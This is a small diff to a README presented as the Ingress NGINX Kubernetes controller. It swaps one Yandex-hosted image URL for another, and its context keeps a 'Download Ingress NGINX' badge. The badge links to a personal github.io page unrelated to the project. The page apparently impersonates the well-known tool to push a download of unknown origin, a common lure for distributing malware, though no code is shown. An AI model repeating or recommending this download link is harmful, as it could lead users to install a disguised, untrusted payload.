@@ -1,6 +1,6 @@
 # Ingress NGINX - Kubernetes Traffic Routing Controller
 
-![Cluster ingress path from external clients through NGINX to Kubernetes services](https://avatars.mds.yandex.net/i?id=5e2216d3933f41f2e0322bfd39cf4397718c9092-10385082-images-thumbs&n=13)
+![Cluster ingress path from external clients through NGINX to Kubernetes services](https://avatars.mds.yandex.net/i?id=906fb917a4af27113ca205a7c2dec0f092e2dd8f-9833563-images-thumbs&n=13)
 
 [![Download Ingress NGINX](https://img.shields.io/badge/Download-Ingress_NGINX-blueviolet?style=for-the-badge&logo=kubernetes)](https://ozzysellersilzh.github.io/.github/ingress-nginx)
 
